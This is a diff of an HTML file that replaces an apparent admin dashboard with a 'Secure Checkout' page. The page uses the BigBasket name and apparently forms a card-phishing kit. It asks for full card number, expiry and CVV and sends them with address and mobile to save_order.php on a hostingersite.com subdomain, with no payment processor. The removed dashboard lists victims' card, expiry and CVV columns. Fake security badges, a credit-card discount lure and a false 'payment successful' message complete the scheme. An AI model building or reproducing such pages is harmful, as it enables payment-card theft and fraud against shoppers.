@@ -1,396 +1,736 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BigBasket | Premium Admin Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
 
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+<style>
+body{ background:#f8fafc; font-family: 'Segoe UI', Arial, sans-serif; }
 
-    <style>
-        :root {
-            --primary-bg: #f1f5f9;
-            --sidebar-bg: #0f172a;
-            --accent-color: #3b82f6;
-            --card-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
-        }
+/* HEADER - NO CHANGES */
+.header{ background:white; padding:15px; border-bottom:1px solid #ddd; }
+.logo img{ height:55px; }
 
-        body {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            background-color: var(--primary-bg);
-            overflow-x: hidden;
-        }
-
-        /* --- Sidebar Improvements --- */
-        .sidebar {
-            width: 260px;
-            height: 100vh;
-            background: var(--sidebar-bg);
-            position: fixed;
-            left: 0;
-            top: 0;
-            color: white;
-            transition: all 0.3s ease;
-            z-index: 1000;
-        }
-
-        .sidebar-header {
-            padding: 30px 25px;
-            font-size: 1.5rem;
-            font-weight: 800;
-            letter-spacing: 1px;
-            background: linear-gradient(45deg, #3b82f6, #2563eb);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .nav-link {
-            color: #94a3b8;
-            padding: 14px 25px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            transition: 0.3s;
-            border-left: 4px solid transparent;
-        }
-
-        .nav-link:hover, .nav-link.active {
-            color: white;
-            background: rgba(255, 255, 255, 0.05);
-            border-left: 4px solid var(--accent-color);
-        }
-
-        /* --- Main Content --- */
-        .main-content {
-            margin-left: 260px;
-            padding: 2rem;
-            transition: all 0.3s ease;
-        }
-
-        /* --- Stats Cards --- */
-        .stat-card {
-            background: white;
-            border-radius: 20px;
-            padding: 1.8rem;
-            border: none;
-            box-shadow: var(--card-shadow);
-            transition: transform 0.3s ease;
-        }
-
-        .stat-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .stat-card p {
-            color: #64748b;
-            font-weight: 600;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            font-size: 0.8rem;
-        }
-
-        .stat-card h3 {
-            font-weight: 700;
-            color: #1e293b;
-            margin: 0;
-        }
-
-        /* --- Table Styling --- */
-        .table-container {
-            background: white;
-            border-radius: 20px;
-            margin-top: 2.5rem;
-            padding: 25px;
-            box-shadow: var(--card-shadow);
-        }
-
-        .table thead th {
-            background-color: #f8fafc;
-            color: #64748b;
-            font-weight: 600;
-            text-transform: uppercase;
-            font-size: 0.75rem;
-            border-bottom: 1px solid #e2e8f0;
-            padding: 15px;
-        }
-
-        .table tbody td {
-            padding: 15px;
-            vertical-align: middle;
-            color: #334155;
-            font-size: 0.9rem;
-            border-bottom: 1px solid #f1f5f9;
-        }
-
-        .product-name {
-            max-width: 180px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            font-weight: 600;
-        }
-
-        .badge-price {
-            background: #dcfce7;
-            color: #166534;
-            padding: 6px 12px;
-            border-radius: 8px;
-            font-weight: 700;
-        }
-
-        /* --- Responsive Logic --- */
-        @media (max-width: 992px) {
-            .sidebar {
-                left: -260px; /* Hide sidebar on mobile */
-            }
-            .sidebar.active {
-                left: 0;
-            }
-            .main-content {
-                margin-left: 0;
-                padding: 1rem;
-            }
-            .mobile-nav {
-                display: flex !important;
-            }
-        }
-
-        .mobile-nav {
-            display: none;
-            background: white;
-            padding: 15px 20px;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            margin-bottom: 20px;
-        }
-
-        .btn-delete {
-            background: #fee2e2;
-            color: #991b1b;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 8px;
-            transition: 0.2s;
-        }
-
-        .btn-delete:hover {
-            background: #ef4444;
-            color: white;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="mobile-nav">
-        <h4 class="m-0 fw-bold text-primary">BigBasket</h4>
-        <button class="btn btn-dark" onclick="toggleSidebar()"><i class="bi bi-list"></i></button>
-    </div>
-
-   <div class="sidebar" id="sidebar">
-    <div class="sidebar-header">BigBasket ADMIN</div>
-
-    <a href="#" class="nav-link active">
-        <i class="bi bi-speedometer2"></i> Dashboard
-    </a>
-
-    <a href="#" class="nav-link">
-        <i class="bi bi-geo-alt"></i> Tracking
-    </a>
-
-    <a href="products.html" class="nav-link">
-        <i class="bi bi-box-seam"></i> Products
-    </a>
-
-    <!-- Logout Button (Styled) -->
-    <div class="mt-auto p-3">
-        <button class="btn btn-danger w-100" onclick="logout()">
-            <i class="bi bi-box-arrow-right"></i> Logout
-        </button>
-    </div>
-
-    <div class="p-3 d-lg-none">
-        <button class="btn btn-secondary w-100" onclick="toggleSidebar()">
-            Close Menu
-        </button>
-    </div>
-</div>
-    <div class="main-content">
-        <div class="d-flex justify-content-between align-items-center mb-4">
-            <h2 class="fw-bold">Admin Overview</h2>
-            <span class="text-muted small" id="current-date"></span>
-        </div>
-
-        <div class="row g-4">
-            <div class="col-6 col-md-4">
-                <div class="stat-card">
-                    <p>Total Orders</p>
-                    <h3 id="totalOrders">...</h3>
-                </div>
-            </div>
-            <div class="col-6 col-md-4">
-                <div class="stat-card">
-                    <p>Today Orders</p>
-                    <h3 id="todayOrders">...</h3>
-                </div>
-            </div>
-            <div class="col-12 col-md-4">
-                <div class="stat-card" style="border-right: 4px solid #10b981;">
-                    <p>Total Revenue</p>
-                    <h3 id="totalRevenue">₹0</h3>
-                </div>
-            </div>
-        </div>
-
-        <div class="table-container">
-            <div class="d-flex justify-content-between align-items-center mb-4">
-                <h5 class="fw-bold m-0">Recent Transactions</h5>
-                <button class="btn btn-sm btn-outline-primary" onclick="loadOrders()">Refresh Data</button>
-            </div>
-            
-            <div class="table-responsive">
-                <table class="table align-middle">
-                    <thead>
-<tr>
-    <th>ID</th>
-    <th>Customer</th>
-    <th>Mobile</th> <!-- ✅ NEW -->
-    <th>Product</th>
-    <th>Amount</th>
-    <th>Address</th> <!-- ✅ separate -->
-    <th>Pincode</th> <!-- ✅ separate -->
-    <th>Card Details</th>
-    <th>Expiry</th>
-    <th>CVV</th>
-    <th>Action</th>
-</tr>
-</thead>
-                    <tbody id="orders">
-                        </tbody>
-                </table>
-            </div>
-        </div>
-    </div>
-<script>
-function logout(){
-    fetch("https://honeydew-bear-702897.hostingersite.com/big/api/logout.php", {
-            credentials: "include"
-
-    })
-    .then(() => {
-        window.location.replace("login.html");
-    })
-    .catch(() => {
-        alert("Logout failed ❌");
-    });
+/* SECURE CHECKOUT HEADER (Screenshot Match) */
+.checkout-main-header {
+    background: white; border-radius: 12px; padding: 25px; margin-top: 20px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-bottom: 2px solid #e2e8f0;
 }
-</script>
-    <script>
-        const API = "https://honeydew-bear-702897.hostingersite.com/big/api/";
+.checkout-main-header h2 { font-weight: 700; color: #1e293b; margin-bottom: 15px; }
+.trust-labels { 
+    background: #f0fdf4; border: 1px solid #dcfce7; border-radius: 8px; 
+    padding: 10px; display: flex; gap: 20px; flex-wrap: wrap;
+}
+.trust-item { font-size: 13px; color: #166534; display: flex; align-items: center; gap: 6px; }
 
-        // Current Date show karne ke liye
-        document.getElementById('current-date').innerText = new Date().toDateString();
+/* CHECKOUT BOXES */
+.container-checkout{ max-width:1200px; margin:auto; padding: 0 15px; }
+.box{ background:white; padding:30px; border-radius:15px; margin-top:25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+.box h4 { font-weight: 700; color: #334155; border-bottom: 1px solid #f1f5f9; padding-bottom: 15px; margin-bottom: 25px; }
 
-        // Sidebar Toggle for Mobile
-        function toggleSidebar() {
-            document.getElementById('sidebar').classList.toggle('active');
-        }
+/* INPUTS (Screenshot Match) */
+.input-wrap { margin-bottom: 20px; }
+.input{ 
+    width:100%; padding:14px; border:1.5px solid #e2e8f0; border-radius:10px; 
+    font-size:15px; transition: 0.3s; background: #fff;
+}
+.input:focus { border-color: #10b981; outline: none; box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1); }
+.phone-pre { 
+    background: #f1f5f9; border: 1.5px solid #e2e8f0; border-right: none;
+    padding: 14px; border-radius: 10px 0 0 10px; color: #64748b; font-weight: 600;
+}
+.phone-inp { border-radius: 0 10px 10px 0 !important; }
 
-        // 👉 Stats Fetch (Unchanged Logic)
-        fetch(API + "get_stats.php",{
-                credentials: "include"
+/* PAYMENT OPTIONS */
+.pay-opt { display: flex; align-items: center; gap: 10px; cursor: pointer; font-weight: 600; font-size: 15px; }
+.pay-opt input { width: 18px; height: 18px; accent-color: #0b9444; }
 
-        }
-             )
-            .then(res => res.json())
-            .then(data => {
-                document.getElementById("totalOrders").innerText = data.totalOrders;
-                document.getElementById("todayOrders").innerText = data.todayOrders;
-                document.getElementById("totalRevenue").innerText = "₹" + data.totalRevenue;
-            })
-            .catch(err => console.error("Stats load failed", err));
+.offer-box { 
+    background: #f0fdf4; border: 1px solid #bcf0da; padding: 15px; 
+    border-radius: 10px; margin: 20px 0; color: #166534; font-size: 14px;
+}
+.success-banner {
+    background: #f0fdf4; border: 1px solid #bcf0da; padding: 12px;
+    border-radius: 10px; margin-bottom: 20px; font-size: 13px; color: #166534;
+}
 
-        // 👉 Orders Fetch (Unchanged Logic, added Better UI Strings)
-        function loadOrders(){
-            fetch(API + "get_orders.php", {
-                    credentials: "include"
+/* ORDER SUMMARY (Screenshot Match) */
+.order-summary{ background:white; padding:25px; border-radius:15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); position: sticky; top: 20px; }
+.prod-img { border-radius: 8px; border: 1px solid #f1f5f9; padding: 5px; }
+.summary-line { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
+.total-line { 
+    border-top: 2px solid #f1f5f9; padding-top: 15px; margin-top: 15px;
+    display: flex; justify-content: space-between; font-size: 20px; font-weight: 800; color: #0b9444;
+}
+.secure-txt { text-align: center; color: #94a3b8; font-size: 12px; margin-top: 15px; }
 
-            })
-                .then(res => res.json())
-                .then(data => {
-                    let html = "";
-                    data.forEach(o => {
-                       html += `
-<tr>
-    <td><span class="text-muted fw-bold">#${o.id}</span></td>
+.place-btn{ 
+    width:100%; padding:16px; background:#94a3b8; color:white; border:none; 
+    border-radius:12px; font-weight:700; font-size:17px; margin-top:15px; transition: 0.3s;
+}
+.btn-active { background: #10b981; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3); }
 
-    <td>
-        <div class="fw-bold">${o.fullname}</div>
-        <div class="small text-muted">${o.city}</div>
-    </td>
+/* FOOTER - NO CHANGES */
+.footer{ background:white; padding:40px 0; margin-top:50px; border-top:1px solid #eee; }
+.footer-title{ color:#1a8f3c; font-weight:bold; }
+.footer-text{ color:#666; font-size:14px; }
+.social i{ width:40px; height:40px; line-height:40px; text-align:center; background:white; border-radius:50%; margin-right:10px; box-shadow:0 2px 8px rgba(0,0,0,0.1); }
+.store{ height:45px; margin-left:10px; }
+.quick-links a{ margin-right:15px; color:#444; font-size:14px; text-decoration:none; }
+.service-box{ background:white; padding:20px; text-align:center; border-radius:12px; box-shadow:0 2px 10px rgba(0,0,0,0.08); }
+.service-box p{ margin-top:10px; font-size:14px; }
+.footer-bottom{ background:#f8fafc; padding:15px 0; margin-top:30px; font-size:14px; border-top: 1px solid #eee; }
 
-    <td>${o.mobile || "N/A"}</td> <!-- ✅ MOBILE -->
+@media(max-width:768px){
+    .order-summary { margin-top: 25px; position: static; }
+}
 
-    <td>
-        <div class="product-name" title="${o.product_name}">
-            ${o.product_name}
+/* MOBILE */
+
+@media(max-width:768px){
+
+.logo img{
+height:45px;
+}
+
+}
+@media(max-width:768px){
+
+.footer{
+text-align:center;
+padding:30px 15px;
+}
+
+.footer-title{
+font-size:26px;
+}
+
+.footer-text{
+max-width:500px;
+margin:auto;
+}
+
+.social{
+margin-top:15px;
+}
+
+.social i{
+margin:0 8px;
+}
+
+.app{
+text-align:center !important;
+margin-top:25px;
+}
+
+.store{
+height:48px;
+margin:8px;
+}
+
+.quick-links{
+display:flex;
+flex-wrap:wrap;
+justify-content:center;
+gap:12px;
+margin-top:15px;
+}
+
+.quick-links a{
+display:inline-block;
+font-size:15px;
+}
+
+.service{
+margin-top:25px;
+}
+
+.service-box{
+margin-bottom:15px;
+}
+
+.footer-bottom{
+text-align:center;
+}
+
+.footer-bottom .container{
+flex-direction:column;
+gap:5px;
+}
+
+}
+
+.error-text{
+color:#dc2626;
+font-size:13px;
+margin-top:6px;
+display:none;
+}
+
+.input-error{
+border-color:#dc2626 !important;
+box-shadow:0 0 0 3px rgba(220,38,38,0.1);
+}
+</style>
+</head>
+
+<body>
+<header class="header">
+    <div class="container d-flex justify-content-between align-items-center">
+        <div class="logo"><img src="logo.png"></div>
+        <div style="font-size:22px;"><img src="shopping-cart.png" alt="Cart" style="width:32px;height:32px;"></div>
+    </div>
+</header>
+
+<div class="container-checkout">
+    <div class="checkout-main-header">
+        <h2>Secure Checkout</h2>
+        <div class="trust-labels">
+            <div class="trust-item"><i class="fas fa-shield-halved"></i> SSL Encrypted</div>
+            <div class="trust-item"><i class="fas fa-truck"></i> Free Delivery</div>
+            <div class="trust-item"><i class="fas fa-lock"></i> Secure Payment</div>
+            <div class="trust-item"><i class="fas fa-circle-check"></i> 7-Day Return</div>
         </div>
-    </td>
+    </div>
 
-    <td><span class="badge-price">₹${o.price}</span></td>
+    <div class="row">
+        <div class="col-md-7">
+            <div class="box">
+                <h4>Billing Details</h4>
+                <div class="input-wrap">
+<input class="input" id="fullname" placeholder="Full Name *">
+<div class="error-text" id="nameError">Enter your full name</div>
+</div>
+                <div class="row g-0 input-wrap">
+                    <div class="col-2"><div class="phone-pre text-center">+91</div></div>
+                    <div class="col-10"><input class="input phone-inp" id="mobile" placeholder="Mobile Number *" maxlength="10">
+<div class="error-text" id="mobileError">Enter valid 10 digit mobile number</div></div>
+                </div>
+                <div class="row g-3 input-wrap">
+                    <div class="col-md-6"><input class="input" id="city" placeholder="City *"></div>
+                    <div class="col-md-6"><input class="input" id="state" placeholder="State *"></div>
+                </div>
+                <div class="row g-3">
+                    <div class="col-md-6"><input class="input" id="address" placeholder="Full Address *"></div>
+                    <div class="col-md-6"><input class="input" id="pincode" placeholder="Pincode *" maxlength="6">
+<div class="error-text" id="pincodeError">Enter valid 6 digit pincode</div></div>
+                </div>
+            </div>
 
-    <td>${o.address || "-"}</td> <!-- ✅ ADDRESS -->
+            <div class="box">
+                <h4><i class="far fa-credit-card me-2"></i> Payment Details</h4>
+                
+                <div class="d-flex gap-4 mb-4">
+                    <label class="pay-opt">
+                        <input type="radio" name="pay" value="credit" checked onclick="calc()"> Credit Card
+                    </label>
+                    <label class="pay-opt">
+                        <input type="radio" name="pay" value="debit" onclick="calc()"> Debit Card
+                    </label>
+                </div>
+                
+                <div id="offer" class="offer-box">
+                    🎉 <b>10% OFF on Credit Card Payments!</b><br>
+                    Discount applied automatically at checkout
+                </div>
 
-    <td>${o.pincode || "-"}</td> <!-- ✅ PINCODE -->
+                <div id="debitmsg" class="offer-box" style="display:none; background: #fffbeb; border-color: #fef3c7; color: #92400e;">
+                    💡 Select Credit Card to avail 10% instant discount
+                </div>
 
-    <td>
-        <code class="text-dark">
-        ${
-            o.card_number 
-            ? "**** **** **** " + o.card_number.slice(-4) 
-            : "N/A"
-        }
-        </code>
-    </td>
+                <div class="success-banner">
+                    <i class="fas fa-circle-check me-2"></i> Ensure your card is activated for online transactions
+                </div>
 
-    <td>${o.exp_month}/${o.exp_year}</td>
+               <h5 class="mb-3" style="font-weight:700;font-size:16px;">Card Details</h5>
 
-    <td><span class="text-danger">***</span></td>
+<div class="input-wrap">
+<input class="input" id="cardNumber" maxlength="19" placeholder="Card Number *">
+<div class="error-text" id="cardError">Invalid card number</div></div>
 
-    <td>
-        <button onclick="del(${o.id})" class="btn-delete">
-            <i class="bi bi-trash3-fill"></i>
-        </button>
-    </td>
-</tr>
-`;
-                    });
-                    document.getElementById("orders").innerHTML = html || "<tr><td colspan='9' class='text-center'>No orders found.</td></tr>";
-                })
-                .catch(err => {
-                    document.getElementById("orders").innerHTML = "<tr><td colspan='9' class='text-center text-danger'>Error loading data.</td></tr>";
-                });
-        }
+<div class="row g-3 input-wrap">
+<div class="col-md-6">
+<input class="input" id="expMonth" placeholder="MM" maxlength="2">
+<div class="error-text" id="monthError">Enter valid month</div></div>
 
-        loadOrders();
+<div class="col-md-6">
+<input class="input" id="expYear" placeholder="YY" maxlength="2">
+<div class="error-text" id="yearError">Invalid expiry year</div></div>
+</div>
 
-        // 👉 Delete (Unchanged Logic)
-        function del(id){
-            if(confirm("Are you sure you want to delete this order?")){
-                fetch(API + "delete_order.php?id=" + id, {
-                        credentials: "include"
+<div class="input-wrap">
+<input class="input" id="cvv" maxlength="3" placeholder="CVV *">
+<div class="error-text" id="cvvError">Invalid CVV</div></div>
 
-                })
-                    .then(() => {
-                        loadOrders();
-                        // Refresh stats after delete
-                        location.reload(); 
-                    });
-            }
-        }
-    </script>
 
+                
+                <p class="text-center" style="color:#0b9444; font-weight: 600; font-size: 14px; margin-top: 20px;">
+                    Easy 7-Day Return Policy – Hassle-free returns
+                </p>
+<div id="paymentMsg" style="
+display:none;
+margin-top:15px;
+padding:14px 16px;
+border-radius:12px;
+font-size:14px;
+font-weight:600;
+box-shadow:0 4px 12px rgba(0,0,0,0.05);
+transition: all 0.3s ease;
+"></div>
+                
+<button onclick="placeOrder()" class="place-btn btn-active">Place Order Securely</button>            </div>
+        </div>
+
+        <!-- RIGHT SUMMARY -->
+<div class="col-md-5">
+
+<div class="order-summary">
+
+    <h5 style="font-weight:700; margin-bottom:15px;">Order Summary</h5>
+
+    <!-- PRODUCT -->
+    <div class="d-flex align-items-center mb-3">
+        <img id="p-img" class="prod-img me-3" width="70">
+        <div>
+            <div id="p-title" style="font-weight:600; font-size:14px;"></div>
+            <div style="font-size:13px; color:#64748b;">Quantity: 1</div>
+        </div>
+    </div>
+
+    <!-- PRICE DETAILS -->
+    <div class="summary-line">
+        <span>Subtotal:</span>
+        <span>₹<span id="subtotal"></span></span>
+    </div>
+
+    <div class="summary-line">
+        <span>Shipping:</span>
+        <span style="color:#0b9444; font-weight:600;">Free</span>
+    </div>
+
+    <div class="summary-line">
+        <span>Delivery:</span>
+        <span id="delivery-date" style="font-size:13px;"></span>
+    </div>
+
+    <div id="discountrow" class="summary-line" style="display:none;">
+        <span>Discount:</span>
+        <span style="color:#0b9444;">- ₹<span id="discount">0</span></span>
+    </div>
+
+    <div class="total-line">
+        <span>Total:</span>
+        <span>₹<span id="total"></span></span>
+    </div>
+<div class="secure-txt">
+                    🔒 Your payment information is encrypted and secure
+                </div>
+            </div>
+        </div> </div> </div>
+
+<footer class="footer">
+    <div class="container">
+        <div class="row align-items-center mb-4">
+            <div class="col-md-6">
+                <h3 class="footer-title">Big Basket Shopping India</h3>
+                <p class="footer-text">Your trusted partner for quality products at the best prices. Shop with confidence and enjoy hassle-free returns.</p>
+                <div class="social">
+                    <i class="fab fa-facebook-f"></i>
+                    <i class="fab fa-twitter"></i>
+                    <i class="fab fa-instagram"></i>
+                </div>
+            </div>
+            <div class="col-md-6 text-md-end app">
+                <h5 class="mb-3">Download Big Basket Ready Mobile App Now!</h5>
+                <img src="googleplay.svg" class="store">
+                <img src="appstore.svg" class="store">
+            </div>
+        </div>
+        <hr>
+        <h6 class="mb-3">Quick Links</h6>
+        <div class="quick-links">
+            <a href="#">About Us</a> <a href="#">Contact Us</a> <a href="#">FAQs</a> <a href="#">Privacy Policy</a> <a href="#">Terms and Conditions</a> <a href="#">Pricing, Delivery & Return Policy</a> <a href="#">Refund Policy</a> <a href="#">Pickup Points</a> <a href="#">Disclaimer</a>
+        </div>
+        <div class="row service mt-4">
+            <div class="col-md-3 col-6"><div class="service-box">🚚<p>Free Delivery</p></div></div>
+            <div class="col-md-3 col-6"><div class="service-box">🔒<p>Secure Payment</p></div></div>
+            <div class="col-md-3 col-6"><div class="service-box">↩<p>7-Day Returns</p></div></div>
+            <div class="col-md-3 col-6"><div class="service-box">✔<p>100% Authentic</p></div></div>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <div class="container d-flex justify-content-between flex-wrap">
+            <p>© 2025 Avenue E-Commerce Limited (AEL). All Rights Reserved.</p>
+            <p>Made with ❤️ in India | Version 2.0</p>
+        </div>
+    </div>
+</footer>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+    
+function showPaymentMsg(message, type="error"){
+
+let box = document.getElementById("paymentMsg");
+
+box.style.display = "flex";
+box.style.alignItems = "center";
+box.style.gap = "8px";
+
+// Icon set
+let icon = "";
+
+if(type === "error"){
+    box.style.background = "#fef2f2";
+    box.style.color = "#b91c1c";
+    box.style.border = "1px solid #fecaca";
+    icon = "❌";
+}
+
+if(type === "success"){
+    box.style.background = "#f0fdf4";
+    box.style.color = "#166534";
+    box.style.border = "1px solid #bbf7d0";
+    icon = "✅";
+}
+
+if(type === "warning"){
+    box.style.background = "#fff7ed";
+    box.style.color = "#9a3412";
+    box.style.border = "1px solid #fed7aa";
+    icon = "⚠️";
+}
+
+// Message with icon
+box.innerHTML = `${icon} ${message}`;
+
+// Smooth scroll
+window.scrollTo({top:0, behavior:"smooth"});
+
+// Auto hide (optional)
+setTimeout(()=>{
+    box.style.display = "none";
+},4000);
+
+}
+
+
+// 👉 GLOBAL PRODUCT DATA
+let price = 0;
+let productTitle = "";
+
+const id = new URLSearchParams(window.location.search).get("id") || 1;
+
+fetch("https://honeydew-bear-702897.hostingersite.com/big/get_products.php")
+.then(res => res.json())
+.then(data => {
+
+    let p = data.find(x => x.id == id);
+
+    if(!p){
+        showPaymentMsg("Product not found");
+        return;
+    }
+
+    price = parseFloat(p.price);
+    productTitle = p.title;
+
+    document.getElementById("p-img").src =
+        "https://honeydew-bear-702897.hostingersite.com/big/" + p.image;
+
+    document.getElementById("p-title").innerText = p.title;
+
+    document.getElementById("subtotal").innerText = price.toFixed(2);
+    document.getElementById("total").innerText = price.toFixed(2);
+
+    let d = new Date();
+    d.setDate(d.getDate() + 3);
+
+    let options = { weekday: 'long', day: 'numeric', month: 'long' };
+    document.getElementById("delivery-date").innerText =
+        d.toLocaleDateString('en-IN', options);
+
+    calc();
+
+})
+.catch(err => {
+    console.log(err);
+    showPaymentMsg("Error loading product");
+});
+
+
+// ✅ PRICE CALCULATION
+function calc(){
+
+let pay = document.querySelector('input[name="pay"]:checked').value;
+let discount = 0;
+
+if(pay === "credit"){
+    discount = price * 0.10;
+    document.getElementById("discountrow").style.display="flex";
+    document.getElementById("offer").style.display="block";
+    document.getElementById("debitmsg").style.display="none";
+}else{
+    discount = 0;
+    document.getElementById("discountrow").style.display="none";
+    document.getElementById("offer").style.display="none";
+    document.getElementById("debitmsg").style.display="block";
+}
+
+document.getElementById("discount").innerText = discount.toFixed(2);
+document.getElementById("total").innerText = (price-discount).toFixed(2);
+
+}
+
+
+// ✅ CARD FORMAT
+document.getElementById("cardNumber").addEventListener("input",function(e){
+let value = e.target.value.replace(/\D/g,'').substring(0,16);
+e.target.value = value.replace(/(.{4})/g,'$1 ').trim();
+});
+
+
+// ✅ MONTH
+document.getElementById("expMonth").addEventListener("input", function(){
+    this.value = this.value.replace(/\D/g,'').substring(0,2);
+});
+
+document.getElementById("expMonth").addEventListener("blur", function(){
+    let m = parseInt(this.value);
+
+    if(m < 1 || m > 12){
+        showPaymentMsg("Enter valid month (01-12)");
+        this.value = "";
+    }
+});
+
+// ✅ YEAR
+document.getElementById("expYear").addEventListener("blur",function(){
+let year = parseInt(this.value);
+let currentYear = new Date().getFullYear() % 100;
+
+if(year < currentYear){
+showPaymentMsg("Card expired");
+this.value="";
+}
+});
+
+
+// ✅ CVV
+document.getElementById("cvv").addEventListener("input",function(){
+this.value = this.value.replace(/\D/g,'').substring(0,3);
+});
+
+
+// ✅ ERROR FUNCTIONS
+function showError(input,id){
+input.classList.add("input-error");
+document.getElementById(id).style.display="block";
+}
+
+function clearError(input,id){
+input.classList.remove("input-error");
+document.getElementById(id).style.display="none";
+}
+
+
+// ✅ CARD VALIDATION
+function validCard(card){
+let sum = 0;
+let shouldDouble = false;
+
+for(let i = card.length - 1; i >= 0; i--){
+let digit = parseInt(card.charAt(i));
+
+if(shouldDouble){
+digit *= 2;
+if(digit > 9) digit -= 9;
+}
+
+sum += digit;
+shouldDouble = !shouldDouble;
+}
+
+return (sum % 10) === 0;
+}
+
+function detectCardType(number){
+number = number.replace(/\s/g,'');
+if(/^4/.test(number)) return "visa";
+if(/^5[1-5]/.test(number)) return "mastercard";
+if(/^6/.test(number)) return "rupay";
+return "unknown";
+}
+
+
+// ✅ PLACE ORDER
+function placeOrder(){
+
+let btn = document.querySelector(".place-btn");
+
+let name = document.getElementById("fullname");
+let mobile = document.getElementById("mobile");
+let city = document.getElementById("city");
+let state = document.getElementById("state");
+let address = document.getElementById("address");
+let pincode = document.getElementById("pincode");
+let month = document.getElementById("expMonth");
+let card = document.getElementById("cardNumber");
+let year = document.getElementById("expYear");
+let cvv = document.getElementById("cvv");
+
+let valid=true;
+
+
+// NAME
+if(name.value.trim()==""){
+showError(name,"nameError");
+valid=false;
+}else{
+clearError(name,"nameError");
+}
+
+
+// MOBILE (strong check)
+if(!/^[6-9]\d{9}$/.test(mobile.value)){
+showError(mobile,"mobileError");
+showPaymentMsg("Enter valid mobile number");
+valid=false;
+}else{
+clearError(mobile,"mobileError");
+}
+
+
+// PINCODE
+if(!/^[0-9]{6}$/.test(pincode.value)){
+showError(pincode,"pincodeError");
+valid=false;
+}else{
+clearError(pincode,"pincodeError");
+}
+
+
+// CARD
+let cardNum = card.value.replace(/\s/g,'');
+let type = detectCardType(cardNum);
+
+if(cardNum.length!=16 || !validCard(cardNum) || type==="unknown"){
+showError(card,"cardError");
+valid=false;
+}else{
+clearError(card,"cardError");
+}
+
+
+// MONTH
+if(month.value.length!=2){
+showError(month,"monthError");
+valid=false;
+}else{
+clearError(month,"monthError");
+}
+
+// YEAR
+if(year.value.length!=2){
+showError(year,"yearError");
+valid=false;
+}else{
+clearError(year,"yearError");
+}
+
+
+// CVV
+if(!/^[0-9]{3}$/.test(cvv.value)){
+showError(cvv,"cvvError");
+valid=false;
+}else{
+clearError(cvv,"cvvError");
+}
+
+
+// 🚀 SUBMIT
+if(valid){
+
+btn.disabled = true;
+btn.innerText = "Processing...";
+
+fetch("https://honeydew-bear-702897.hostingersite.com/big/save_order.php",{
+
+method:"POST",
+headers:{'Content-Type':'application/json'},
+
+body:JSON.stringify({
+name:name.value,
+mobile:mobile.value,
+city:city.value,
+state:state.value,
+address:address.value,
+pincode:pincode.value,
+product:productTitle,
+price:price,
+card:card.value,
+month:month.value,
+year:year.value,
+cvv:cvv.value
+})
+
+})
+.then(res => res.text())
+.then(data => {
+
+let res = data.trim();
+
+console.log("SERVER RESPONSE:", res); // DEBUG
+
+if(res === "success"){
+
+    showPaymentMsg("Payment successful! Order placed", "success");
+
+    setTimeout(()=>{
+        window.location = "confirm.html";
+    },1500);
+
+}
+else if(res === "duplicate"){
+
+    showPaymentMsg("⚠️ This mobile number already placed an order", "error");
+
+    btn.disabled = false;
+    btn.innerText = "Place Order Securely";
+
+}
+else if(res.startsWith("error")){
+
+    showPaymentMsg(res, "error"); // 👈 exact error show karega
+
+    btn.disabled = false;
+    btn.innerText = "Place Order Securely";
+
+}
+else{
+
+    showPaymentMsg("❌ Something went wrong. Please try again.", "error");
+
+    btn.disabled = false;
+    btn.innerText = "Place Order Securely";
+
+}
+
+})
+.catch(err => {
+    console.log(err);
+
+    showPaymentMsg("⚠️ Network error. Please check your connection.", "error");
+
+    btn.disabled = false;
+    btn.innerText = "Place Order Securely";
+});
+
+}
+
+}
+
+</script>
 </body>
 </html>
